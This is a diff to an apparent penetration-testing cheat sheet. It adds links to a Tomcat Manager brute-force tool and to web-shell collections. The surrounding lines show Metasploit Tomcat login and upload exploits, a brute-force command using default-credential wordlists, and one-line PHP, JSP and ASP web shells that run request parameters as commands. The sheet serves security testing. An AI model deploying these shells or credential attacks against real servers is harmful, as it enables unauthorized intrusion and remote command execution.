@@ -1023,6 +1023,7 @@ http://<IP address>:<port>/host-manager
 $ curl -s http://<domain name>:8080/docs/ | grep Tomcat 
 msf > use auxiliary/scanner/http/tomcat_mgr_login
 msf > use exploit/multi/http/tomcat_mgr_upload
+https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce
 $ python3 mgr_brute.py -U <URL> -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
 ```
 
@@ -3239,6 +3240,8 @@ msf> use exploit/multi/handler
 https://github.com/jbarcia/Web-Shells/tree/master/laudanum
 https://github.com/samratashok/nishang/tree/master/Antak-WebShell
 https://github.com/WhiteWinterWolf/wwwolf-php-webshell
+https://github.com/tennc/webshell
+https://github.com/SecurityRiskAdvisors/cmd.jsp
 PHP: <?php system($_REQUEST["cmd"]); ?>
 JSP: <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ASP: <% eval request("cmd") %>
